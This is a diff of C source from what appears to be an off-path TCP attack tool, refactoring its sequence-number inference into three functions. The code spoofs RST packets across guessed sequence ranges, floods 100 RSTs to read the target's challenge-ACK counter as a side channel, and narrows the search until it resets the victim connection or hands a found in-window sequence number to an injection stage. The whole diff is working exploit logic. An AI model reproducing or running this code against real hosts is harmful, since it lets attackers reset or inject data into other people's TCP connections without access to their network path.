@@ -1048,100 +1048,145 @@ int infer_four_tuple(void)
  * 3. figure out the exact sequence number - step:2,3
  *    we used a hybrid (chunk and binary) search for this step.
  */
-int infer_sequence_number(void)
+int infer_sequence_step1(u_long *pstart, u_long *pend)
 {
 	struct timeval round_start;
 	volatile conn_t *spoof = &(g_ctx.spoof);
-	int step = -1;
 	/* printing status */
 	u_long pr_start, pr_end, pkts_sent;
 	/* chunk-based search vars */
 	chunk_t *sched = NULL;
 	int nchunks = 0, ci = 0;
+
+	/* allocate a schedule for testing sequence blocks
+	 * NOTE: the values in the schedule are actually block numbers
+	 */
+	sched = build_schedule(*pstart / g_ctx.winsz, *pend / g_ctx.winsz,
+			g_ctx.packets_per_second, &nchunks);
+	if (!sched)
+		return 0;
+
+	/* further stages will launch as things progress */
+	while (1) {
+		u_long seq_block;
+		gettimeofday(&round_start, NULL);
+
+		/* set these for printing status */
+		pr_start = sched[ci].start * g_ctx.winsz;
+		pr_end = sched[ci].end * g_ctx.winsz;
+
+		/* send em! */
+		pkts_sent = 0;
+		// XXX: TODO: implement optmization for < 14 ports to probe...
+		for (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {
+			spoof->seq = seq_block * g_ctx.winsz;
+			if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0)) {
+				free(sched);
+				return 0;
+			}
+			usleep(g_ctx.packet_delay);
+			pkts_sent++;
+		}
+		/* we'll do maintenance after we check the results */
+
+#ifdef DEBUG_SEQ_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent,
+				diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000)) {
+			free(sched);
+			return 0;
+		}
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("seq-infer recv", &round_start, 1, 0);
+
+		printf("[*] seq-infer: guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
+				pr_start, pr_end, pkts_sent, g_chack_cnt);
+
+		/* adjust the search based on the results and mode */
+		if (g_chack_cnt == 100) {
+			ci++;
+			if (ci == nchunks) {
+				printf("[!] Exhausted seq window search...\n");
+				free(sched);
+				return 0;
+			}
+		} else if (g_chack_cnt < 100) {
+			*pstart = pr_start;
+			*pend = pr_end + g_ctx.winsz;
+
+			printf("[*] Narrowed sequence (1) to %lu - %lu (%lu possibilities)\n",
+					*pstart, *pend, *pend - *pstart);
+
+			/* adjust winsz if g_chack_cnt < 99 */
+			if (g_chack_cnt < 99) {
+				u_long tmp, old;
+
+				old = g_ctx.winsz;
+				tmp = old * 2;
+				printf("[*] NOTE: Window size too conservative, doubling to %lu...\n", tmp);
+				g_ctx.winsz = tmp;
+
+				/* we need to fix the range to the new window size too */
+				*pstart = (*pstart * old) / tmp;
+				*pend = (*pend * old) / tmp;
+			}
+
+			/* reset the schedule */
+			g_chack_cnt = 0;
+			free(sched);
+			return 1;
+		} else {
+			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+		}
+
+		g_chack_cnt = 0;
+	}
+
+	/* should not be reached */
+	free(sched);
+	return 0;
+}
+
+int infer_sequence_step2(u_long *pstart, u_long *pend)
+{
+	struct timeval round_start;
+	volatile conn_t *spoof = &(g_ctx.spoof);
+	/* printing status */
+	u_long pr_start, pr_end, pkts_sent;
 	/* binary search vars */
-	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
+	u_long bs_start, bs_end, bs_mid = 0;
+	u_long seq_block;
+
+	bs_start = *pstart / g_ctx.winsz;
+	bs_end = *pend / g_ctx.winsz;
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
 
-		/* initialize whatever is needed */
-		if (step == -1) {
-			/* allocate a schedule for testing sequence blocks
-			 * NOTE: the values in the schedule are actually block numbers
-			 */
-			step = 0;
+		/* select a new mid */
+		bs_mid = (bs_start + bs_end) / 2;
 
-			if (g_ctx.start_seq)
-				sched = build_schedule(g_ctx.start_seq / g_ctx.winsz,
-						UINT32_MAX / g_ctx.winsz, g_ctx.packets_per_second,
-						&nchunks);
-			else
-				sched = build_schedule(0, UINT32_MAX / g_ctx.winsz,
-						g_ctx.packets_per_second, &nchunks);
-			if (!sched)
+		/* set these for printing status */
+		pr_start = bs_mid * g_ctx.winsz;
+		pr_end = bs_end * g_ctx.winsz;
+
+		/* send em! */
+		pkts_sent = 0;
+		// XXX: TODO: implement optmization for < 14 ports to probe...
+		for (seq_block = bs_mid; seq_block < bs_end; seq_block++) {
+			spoof->seq = seq_block * g_ctx.winsz;
+			if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
 				return 0;
-			/* further stages will launch as things progress */
+			usleep(g_ctx.packet_delay);
+			pkts_sent++;
 		}
-
-		/* send packets depending on the step we're in */
-		if (step == 0) {
-			u_long seq_block;
-
-			/* set these for printing status */
-			pr_start = sched[ci].start * g_ctx.winsz;
-			pr_end = sched[ci].end * g_ctx.winsz;
-
-			/* send em! */
-			pkts_sent = 0;
-			// XXX: TODO: implement optmization for < 14 ports to probe...
-			for (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {
-				spoof->seq = seq_block * g_ctx.winsz;
-				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
-					return 0;
-				usleep(g_ctx.packet_delay);
-				pkts_sent++;
-			}
-			/* we'll do maintenance after we check the results */
-		} else if (step == 1) {
-			u_long seq_block;
-
-			/* select a new mid */
-			bs_mid = (bs_start + bs_end) / 2;
-
-			/* set these for printing status */
-			pr_start = bs_mid * g_ctx.winsz;
-			pr_end = bs_end * g_ctx.winsz;
-
-			/* send em! */
-			pkts_sent = 0;
-			// XXX: TODO: implement optmization for < 14 ports to probe...
-			for (seq_block = bs_mid; seq_block < bs_end; seq_block++) {
-				spoof->seq = seq_block * g_ctx.winsz;
-				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
-					return 0;
-				usleep(g_ctx.packet_delay);
-				pkts_sent++;
-			}
-			/* we'll do maintenance after we check the results */
-		} else if (step == 2) {
-			u_long seq_guess;
-
-			/* set these for printing status */
-			pr_start = sched[ci].end;
-			pr_end = sched[ci].start;
-
-			/* send em! */
-			pkts_sent = 0;
-			// XXX: TODO: implement optmization for < 14 ports to probe...
-			for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
-				spoof->seq = seq_guess;
-				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
-					return 0;
-				usleep(g_ctx.packet_delay);
-				pkts_sent++;
-			}
-			/* we'll do maintenance after we check the results */
-		}
+		/* we'll do maintenance after we check the results */
 
 #ifdef DEBUG_SEQ_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
@@ -1160,118 +1205,160 @@ int infer_sequence_number(void)
 		printf("[*] seq-infer: guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
 				pr_start, pr_end, pkts_sent, g_chack_cnt);
 
-		/* adjust the search based on the results and mode */
-		if (step == 0) {
-			if (g_chack_cnt == 100) {
-				ci++;
-				if (ci == nchunks) {
-					printf("[!] Exhausted seq window search...\n");
-					return 0;
-				}
-			} else if (g_chack_cnt < 100) {
-				bs_start = sched[ci].start;
-				bs_end = sched[ci].end;
-				printf("[*] Narrowed sequence (1) to %lu - %lu (%lu possibilities)\n",
-						pr_start,
-						pr_end + g_ctx.winsz,
-						(pr_end + g_ctx.winsz) - pr_start);
-
-				/* adjust winsz if g_chack_cnt < 99 */
-				if (g_chack_cnt < 99) {
-					u_long tmp, old;
-
-					old = g_ctx.winsz;
-					tmp = old * 2;
-					printf("[*] NOTE: Window size too conservative, doubling to %lu...\n", tmp);
-					g_ctx.winsz = tmp;
-
-					/* we need to fix the range to the new window size too */
-					bs_start = (bs_start * old) / tmp;
-					bs_end = (bs_end * old) / tmp;
-				}
-
-				/* reset the schedule */
-				free(sched);
-				sched = NULL;
-				nchunks = 0;
-
-				/* proceed to the next step */
-				step = 1;
+		/* figure out which chunk exactly! */
+		if (g_chack_cnt == 100) {
+			if (bs_start >= bs_end) {
+				/* FAIL! */
+				printf("[!] Exhausted seq window binary search...\n");
+				/* go back to the beginning of the schedule?? */
+				return 0;
 			} else {
-				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+				/* adjust range */
+				bs_end = bs_mid;
 			}
-		} else if (step == 1) {
-			/* figure out which chunk exactly! */
-			if (g_chack_cnt == 100) {
-				if (bs_start >= bs_end) {
-					/* FAIL! */
-					printf("[!] Exhausted seq window binary search...\n");
-					/* go back to the beginning of the schedule?? */
-					return 0;
+		} else if (g_chack_cnt == 99) {
+			/* if we only sent one guess this time, we won! */
+			if (pkts_sent == 1) {
+				u_long seq_block = bs_mid * g_ctx.winsz;
+
+				/* if we want to inject, we go to stage 3 directly */
+				if (g_ctx.inject_server || g_ctx.inject_client) {
+					/* return so the caller will work towards injection */
+					printf("[*] Found in-window sequence number: %lu\n", seq_block);
+					g_ctx.spoof.seq = seq_block;
+					g_chack_cnt = 0;
+					return 1;
 				} else {
-					/* adjust range */
-					bs_end = bs_mid;
-				}
-			} else if (g_chack_cnt == 99) {
-				/* if we only sent one guess this time, we won! */
-				if (pkts_sent == 1) {
-					u_long seq_block = bs_mid * g_ctx.winsz;
+					*pstart = seq_block - g_ctx.winsz;
+					*pend = seq_block + g_ctx.winsz;
 
-					/* if we want to inject, we go to stage 3 directly */
-					if (g_ctx.inject_server || g_ctx.inject_client) {
-						/* return so the caller will perform injection */
-						printf("[*] Found in-window sequence number: %lu\n", seq_block);
-						g_ctx.spoof.seq = seq_block;
-						g_chack_cnt = 0;
-						return 1;
-					} else {
-						/* continue with step2 -- try to reset the connection */
-						printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
-								seq_block - g_ctx.winsz, seq_block + g_ctx.winsz,
-								(u_long)g_ctx.winsz * 2);
-
-						/* build a schedule working from right to left */
-						sched = build_schedule_reverse(seq_block - g_ctx.winsz,
-								seq_block + g_ctx.winsz, g_ctx.packets_per_second,
-								&nchunks);
-						if (!sched)
-							return 0;
-						ci = 0;
-
-						/* proceed to the next step */
-						step = 2;
-					}
-				}
-				else
-					/* adjust range */
-					bs_start = bs_mid;
-			} else {
-				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
-			}
-		} else if (step == 2) {
-			if (g_chack_cnt == 100) {
-				ci++;
-				if (ci == nchunks) {
-					printf("[!] Exhausted sequence number search (1)...\n");
-					return 0;
-				}
-			} else if (g_chack_cnt < 100) {
-				ci++;
-				if (ci == nchunks) {
-					printf("[!] Exhausted sequence number search (2)...\n");
-					return 0;
+					/* continue with step2 -- try to reset the connection */
+					printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
+							*pstart, *pend, (u_long)g_ctx.winsz * 2);
+					return 1;
 				}
 			}
+			else
+				/* adjust range */
+				bs_start = bs_mid;
+		} else {
+			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
 		}
-
-#if 0
-		// XXX: TODO: scale number of guesses per round based on feedback
-#endif
 		g_chack_cnt = 0;
 	}
 
-	/* fail! */
+	/* should not be reached */
 	return 0;
+}
+
+int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
+{
+	struct timeval round_start;
+	volatile conn_t *spoof = &(g_ctx.spoof);
+	/* printing status */
+	u_long pr_start, pr_end, pkts_sent;
+	/* chunk-based search vars */
+	chunk_t *sched = NULL;
+	int nchunks = 0, ci = 0;
+	u_long seq_guess;
+	int saw_lt_100 = 0;
+
+	/* build a schedule working from right to left */
+	sched = build_schedule_reverse(*pstart, *pend, g_ctx.packets_per_second,
+			&nchunks);
+	if (!sched)
+		return 0;
+
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* set these for printing status */
+		pr_start = sched[ci].end;
+		pr_end = sched[ci].start;
+
+		/* send em! */
+		pkts_sent = 0;
+		// XXX: TODO: implement optmization for < 14 ports to probe...
+		for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
+			spoof->seq = seq_guess;
+			if (use_data) {
+				if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
+					return 0;
+			} else {
+				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+					return 0;
+			}
+			usleep(g_ctx.packet_delay);
+			pkts_sent++;
+		}
+		/* we'll do maintenance after we check the results */
+
+#ifdef DEBUG_SEQ_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent,
+				diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
+			return 0;
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("seq-infer recv", &round_start, 1, 0);
+
+		printf("[*] seq-infer: guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
+				pr_start, pr_end, pkts_sent, g_chack_cnt);
+
+		if (g_chack_cnt == 100) {
+			/* if we ever saw < 100 before this, then this means we're done. */
+			if (saw_lt_100) {
+				if (!g_ctx.inject_server && !g_ctx.inject_client)
+					printf("[*] finished! connection should be reset now!\n");
+				g_chack_cnt = 0;
+				return 1;
+			}
+		} else if (g_chack_cnt < 100) {
+			saw_lt_100 = 1;
+		}
+
+		/* otherwise, keep trying... */
+		ci++;
+		if (ci == nchunks) {
+			printf("[!] Exhausted sequence number search without success :-/\n");
+			return 0;
+		}
+
+		g_chack_cnt = 0;
+	}
+
+	/* should not be reached */
+	return 0;
+}
+
+int infer_sequence_number(void)
+{
+	u_long guess_start = 0, guess_end = UINT32_MAX;
+
+	if (g_ctx.start_seq)
+		guess_start = g_ctx.start_seq;
+
+	if (!infer_sequence_step1(&guess_start, &guess_end))
+		return 0;
+
+	if (!infer_sequence_step2(&guess_start, &guess_end))
+		return 0;
+
+	/* if we want to inject, we need to infer the ack number now.
+	 * return so the caller will do so... */
+	if (g_ctx.inject_server || g_ctx.inject_client)
+		return 1;
+
+	if (!infer_sequence_step3(&guess_start, &guess_end, 0))
+		return 0;
+
+	/* we must have reset the connection now, right? */
+	return 1;
 }
 
 
